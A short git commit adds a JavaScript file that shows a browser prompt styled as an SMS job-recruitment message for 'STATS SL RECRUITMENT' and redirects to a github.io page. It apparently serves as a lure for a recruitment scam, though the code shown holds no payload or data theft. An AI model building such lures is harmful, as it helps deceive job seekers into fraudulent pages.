08cfdf593899a29da6790e59397aed3ba8a3194a
offernoww <josiahnyeti16@gmail.com>
2025-02-06 08:38:10 +0100

    Create realup.js

---
+++ realup.js
@@ -0,0 +1,6 @@
+
+var password = 'STATS SL RECRUITMENT'
+password=prompt('SMS :Welcome,Start your application to join the team now, Click OK to begin  ','STATS SL RECRUITMENT');
+if (password != 'STATS SL RECRUITMENT') {
+location.href='https://offernoww.github.io/Statistics-recruitment.sl';
+}
